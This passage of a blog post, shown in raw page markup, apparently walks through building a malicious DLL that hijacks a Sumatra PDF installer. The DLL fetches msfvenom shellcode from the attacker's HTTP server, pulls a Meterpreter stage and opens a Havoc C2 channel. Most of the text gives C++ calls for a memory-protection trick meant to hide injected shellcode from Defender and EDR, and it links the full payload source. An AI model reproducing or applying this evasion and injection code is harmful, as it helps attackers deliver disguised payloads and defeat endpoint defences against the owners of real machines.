and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="200" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*mNHKBQOFSOGNd-M5Vtk__A.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="bdad" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">I added the variables <em class="rl">ip</em>, <em class="rl">port</em>, and <em class="rl">resource</em> to grab my shellcode remotely in the getShellcode_Run() function.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sy"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*_rsvgVIPBVD5kYiVZ6p21A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*_rsvgVIPBVD5kYiVZ6p21A.png 640w, https://miro.medium.com/v2/resize:fit:720/1*_rsvgVIPBVD5kYiVZ6p21A.png 720w, https://miro.medium.com/v2/resize:fit:750/1*_rsvgVIPBVD5kYiVZ6p21A.png 750w, https://miro.medium.com/v2/resize:fit:786/1*_rsvgVIPBVD5kYiVZ6p21A.png 786w, https://miro.medium.com/v2/resize:fit:828/1*_rsvgVIPBVD5kYiVZ6p21A.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*_rsvgVIPBVD5kYiVZ6p21A.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*_rsvgVIPBVD5kYiVZ6p21A.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="37" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*_rsvgVIPBVD5kYiVZ6p21A.png"></picture></div></div></figure><figure class="ma pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm sz"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*uDfa2hghW0Aj1zSTq0eY1Q.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*uDfa2hghW0Aj1zSTq0eY1Q.png 640w, https://miro.medium.com/v2/resize:fit:720/1*uDfa2hghW0Aj1zSTq0eY1Q.png 720w, https://miro.medium.com/v2/resize:fit:750/1*uDfa2hghW0Aj1zSTq0eY1Q.png 750w, https://miro.medium.com/v2/resize:fit:786/1*uDfa2hghW0Aj1zSTq0eY1Q.png 786w, https://miro.medium.com/v2/resize:fit:828/1*uDfa2hghW0Aj1zSTq0eY1Q.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*uDfa2hghW0Aj1zSTq0eY1Q.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*uDfa2hghW0Aj1zSTq0eY1Q.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="204" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*uDfa2hghW0Aj1zSTq0eY1Q.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="5d08" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Last thing we need to do is convert our stage 1 payload on the attacker to binary instead of shellcode since we’re going to serve it remotely. I use the msfvenom command below to create my iloveblogs.bin file instead of raw shellcode in hex. Then I started a HTTP server on port 80 to serve it to the victim.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm ta"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*AYepNwcBHenTEzOQSjqZDw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*AYepNwcBHenTEzOQSjqZDw.png 640w, https://miro.medium.com/v2/resize:fit:720/1*AYepNwcBHenTEzOQSjqZDw.png 720w, https://miro.medium.com/v2/resize:fit:750/1*AYepNwcBHenTEzOQSjqZDw.png 750w, https://miro.medium.com/v2/resize:fit:786/1*AYepNwcBHenTEzOQSjqZDw.png 786w, https://miro.medium.com/v2/resize:fit:828/1*AYepNwcBHenTEzOQSjqZDw.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*AYepNwcBHenTEzOQSjqZDw.png 1100w, https://miro.medium.com/v2/resize:fit:2000/1*AYepNwcBHenTEzOQSjqZDw.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px"><img alt="" class="bi mn py c" width="1000" height="195" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1000/1*AYepNwcBHenTEzOQSjqZDw.png"></picture></div></div></figure></div></div></div><div class="ac ci"><div class="cp bi gq gr gs gt"><p id="401c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Our NEW process for connections looks like this:</p><p id="63c0" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 1) </strong>Victim downloads iloveblogs.bin shellcode (stage 1) from our HTTP server on port 80 and loads it into memory.</p><p id="e468" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 2) </strong>Victim executes this stage 1 payload (iloveblogs.bin) → stage 2 payload downloaded from port 8443 (Metasploit) on attacker</p><p id="1620" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph=""><strong class="ni hm">Step 3) </strong>Stage 2 connection executed on victim and C2 established to port 443 (Havoc C2) on attacker</p><h3 id="48ee" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Try Harder Again</h3><p id="37f2" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">So you’ll notice that this will in fact bypass Defender (YAY), but maybe not some EDR products that scan memory more intently. Other AV/EDR might scan memory when functions such as CreateProcess and CreateRemoteThread are called which we use in our DLL. So to avoid possible detection, we should obscure our code execution even in memory:</p><ol class=""><li id="44be" class="ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob tb od oe bl" data-selectable-paragraph="">Get a handle to the target process. GetProcessesByName will work for this purpose and then open the target process using OpenProcess (like we did previously, no change)</li></ol><blockquote class="ri rj rk"><p id="3676" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">HANDLE processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());</p></blockquote><p id="fd1c" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">2. Call VirtualAllocEx to allocate memory within the target process (like we did previously, no change)</p><blockquote class="ri rj rk"><p id="8d34" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">PVOID remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof recvbuf, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);</p></blockquote><p id="ab43" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">3. Call VirtualProtectEx to set PAGE_NO_ACCESS on the area of memory so AV cannot scan it, but we also can’t write to it yet.</p><blockquote class="ri rj rk"><p id="469c" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">VirtualProtectEx(processHandle, remoteBuffer,sizeof recvbuf, 0x01, NULL);</p></blockquote><p id="4144" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">4. Use CreateRemoteThread<a class="ah rn" href="https://www.bordergate.co.uk/process-injection/" rel="noopener ugc nofollow" target="_blank"> </a>to spawn a suspended thread so that the thread is created but does not start running until explicitly resumed.</p><blockquote class="ri rj rk"><p id="ec5f" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">HANDLE remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0x00000004, NULL);</p></blockquote><p id="d231" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">5. Wait for AV to attempt to carry out it’s scanning, which will come up with nothing because it’s unable to read the memory. This might need to be a delay up to 15 seconds, but one second is barely noticeable.</p><blockquote class="ri rj rk"><p id="a6d3" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Sleep(1090);</p></blockquote><p id="0ef3" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">6. Use VirtualProtectEx (again) to set the permissions back to PAGE_EXECUTE_READWRITE after AV did it’s thing and thinks it’s safe.</p><blockquote class="ri rj rk"><p id="fa5d" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">VirtualProtectEx(processHandle, remoteBuffer, sizeof recvbuf, PROCESS_ALL_ACCESS, NULL);</p></blockquote><p id="14fe" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">7. Finally, call ResumeThread to start our thread.</p><blockquote class="ri rj rk"><p id="1e5e" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">ResumeThread(remoteThread);</p></blockquote><p id="3162" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">8. Use WriteProcessMemory to run our shellcode in memory.</p><blockquote class="ri rj rk"><p id="caf1" class="ng nh rl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">WriteProcessMemory(processHandle, remoteBuffer, recvbuf, sizeof recvbuf, NULL);</p></blockquote><p id="077e" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">Here's the final payload file dllmain.cpp on my Github:</p><div class="qi qj qk ql qm qn"><a href="https://github.com/srothlisberger6361/DLLHijack/blob/main/dllmain.cpp?source=post_page-----733d423fc67b---------------------------------------" rel="noopener  ugc nofollow" target="_blank"><div class="qo ac cb"><div class="qp ac cv ci cd qq"><h2 class="bg hm qr ab ga qs qt qu qv qw qx hk bl">DLLHijack/dllmain.cpp at main · srothlisberger6361/DLLHijack</h2><div class="qy m"><h3 class="bg b qr ab ga qs qt qu qv qw qx eb">Contribute to srothlisberger6361/DLLHijack development by creating an account on GitHub.</h3></div><div class="qz m"><p class="bg b ec ab ga qs qt qu qv qw qx eb">github.com</p></div></div><div class="ra m"><div class="yw m rc rd re ra rf mn qn"></div></div></div></a></div><h3 id="065e" class="rp ol hl bg om rq rr ef op rs rt eh os np ru rv rw nt rx ry rz nx sa sb sc sd bl" data-selectable-paragraph="">Test AV/EDR Bypass (again)</h3><p id="56c3" class="pw-post-body-paragraph ng nh hl ni b ij pg nk nl im ph nn no np pi nr ns nt pj nv nw nx pk nz oa ob he bl" data-selectable-paragraph="">If this Meterpreter shellcode works, then our Havoc C2 connection definitely should since we implemented newer bypass and obscuration techniques for that. I double click on our Sumatra PDF installer executable.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm td"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*BWunmuxRDBAJsjrAimFyOg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*BWunmuxRDBAJsjrAimFyOg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*BWunmuxRDBAJsjrAimFyOg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*BWunmuxRDBAJsjrAimFyOg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*BWunmuxRDBAJsjrAimFyOg.png 786w, https://miro.medium.com/v2/resize:fit:828/1*BWunmuxRDBAJsjrAimFyOg.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*BWunmuxRDBAJsjrAimFyOg.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*BWunmuxRDBAJsjrAimFyOg.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="446" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*BWunmuxRDBAJsjrAimFyOg.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Windows Defender On and Updated</figcaption></figure><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm te"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*aIIMMpPHZBD-QmLFSXScBA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*aIIMMpPHZBD-QmLFSXScBA.png 640w, https://miro.medium.com/v2/resize:fit:720/1*aIIMMpPHZBD-QmLFSXScBA.png 720w, https://miro.medium.com/v2/resize:fit:750/1*aIIMMpPHZBD-QmLFSXScBA.png 750w, https://miro.medium.com/v2/resize:fit:786/1*aIIMMpPHZBD-QmLFSXScBA.png 786w, https://miro.medium.com/v2/resize:fit:828/1*aIIMMpPHZBD-QmLFSXScBA.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*aIIMMpPHZBD-QmLFSXScBA.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*aIIMMpPHZBD-QmLFSXScBA.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="498" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*aIIMMpPHZBD-QmLFSXScBA.png"></picture></div></div><figcaption class="pz fm qa pl pm qb qc bg b bh ab eb" data-selectable-paragraph="">Sumatra PDF Installer Running like Normal</figcaption></figure><p id="2bf9" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">The DLL grabs my stage 1 payload from my HTTP server and executes it over HTTPS to my meterpreter multi/listener.</p><figure class="po pp pq pr ps pt pl pm paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm tf"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/format:webp/1*P2BjjzSCwKx3R80xSWG-QQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*P2BjjzSCwKx3R80xSWG-QQ.png 640w, https://miro.medium.com/v2/resize:fit:720/1*P2BjjzSCwKx3R80xSWG-QQ.png 720w, https://miro.medium.com/v2/resize:fit:750/1*P2BjjzSCwKx3R80xSWG-QQ.png 750w, https://miro.medium.com/v2/resize:fit:786/1*P2BjjzSCwKx3R80xSWG-QQ.png 786w, https://miro.medium.com/v2/resize:fit:828/1*P2BjjzSCwKx3R80xSWG-QQ.png 828w, https://miro.medium.com/v2/resize:fit:1100/1*P2BjjzSCwKx3R80xSWG-QQ.png 1100w, https://miro.medium.com/v2/resize:fit:1400/1*P2BjjzSCwKx3R80xSWG-QQ.png 1400w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 700px"><img alt="" class="bi mn py c" width="700" height="76" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:700/1*P2BjjzSCwKx3R80xSWG-QQ.png"></picture></div></div></figure><p id="af99" class="pw-post-body-paragraph ng nh hl ni b ij nj nk nl im nm nn no np nq nr ns nt nu nv nw nx ny nz oa ob he bl" data-selectable-paragraph="">The HTTPS connection is established over meterpreter and the stage 2 payload is downloaded and executed on the victim.</p></div></div><div class="pt"><div class="ac ci"><div class="mi si mj sj mk sk cm sl cn sm cp bi"><figure class="po pp pq pr ps pt so sp paragraph-image"><div role="button" tabindex="0" class="pu pv fr pw bi px"><span class="fw fx fy ao fz ga gb gc gd speechify-ignore">Press enter or click to view image in full size</span><div class="pl pm tg"><picture><source srcset="https://miro.medium.com/v2/resize:fit:640/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 640w, https://miro.medium.com/v2/resize:fit:720/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 720w, https://miro.medium.com/v2/resize:fit:750/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 750w, https://miro.medium.com/v2/resize:fit:786/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 786w, https://miro.medium.com/v2/resize:fit:828/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 828w, https://miro.medium.com/v2/resize:fit:1100/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 1100w, https://miro.medium.com/v2/resize:fit:2000/format:webp/1*JDupBORwa0hY1Fek5ZA7Bg.png 2000w" sizes="(min-resolution: 4dppx) and (max-width: 700px) 50vw, (-webkit-min-device-pixel-ratio: 4) and (max-width: 700px) 50vw, (min-resolution: 3dppx) and (max-width: 700px) 67vw, (-webkit-min-device-pixel-ratio: 3) and (max-width: 700px) 65vw, (min-resolution: 2.5dppx) and (max-width: 700px) 80vw, (-webkit-min-device-pixel-ratio: 2.5) and (max-width: 700px) 80vw, (min-resolution: 2dppx) and (max-width: 700px) 100vw, (-webkit-min-device-pixel-ratio: 2) and (max-width: 700px) 100vw, 1000px" type="image/webp"><source data-testid="og" srcset="https://miro.medium.com/v2/resize:fit:640/1*JDupBORwa0hY1Fek5ZA7Bg.png 640w, https://miro.medium.com/v2/resize:fit:720/1*JDupBORwa0hY1Fek5ZA7Bg.png 720w, https://miro.medium.com/v2/resize:fit:750/1*JDupBORwa0hY1Fek5ZA7Bg.png 750w, https://miro.medium.com/v2/resize:fit:786/1*JDupBORwa0hY1Fek5ZA7Bg.png 786w, 